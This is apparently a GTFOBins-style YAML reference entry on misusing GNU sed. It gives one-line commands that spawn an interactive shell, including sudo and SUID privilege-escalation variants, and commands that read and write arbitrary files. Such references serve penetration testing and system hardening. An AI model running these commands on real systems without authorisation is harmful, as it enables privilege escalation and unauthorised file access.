---
functions:
  execute-interactive:
    - description: GNU version only. Also, this requires `bash`.
      code: sed -n "1e bash -c 'exec 10<&0 11>&1 0<&2 1>&2; /bin/sh -i'" /etc/hosts
  execute-non-interactive:
    - description: GNU version only.
      code: sed -n "1e id" /etc/hosts
  sudo-enabled:
    - description: GNU version only. Also, this requires `bash`.
      code: sudo sed -n "1e /bin/bash -c 'exec 10<&0 11>&1 0<&2 1>&2; /bin/sh -i'" /etc/hosts
  suid-enabled:
    - description: GNU version only. Also, this requires `bash`.
      code: ./sed -n "1e /bin/bash -c 'exec 10<&0 11>&1 0<&2 1>&2; /bin/sh -i'" /etc/hosts
  file-read:
    - code: |
        LFILE=file_to_read
        sed '' "$LFILE"
  file-write:
    - code: |
        LFILE=file_to_write
        sed -n "1s/.*/data/w $LFILE" /etc/hosts
---
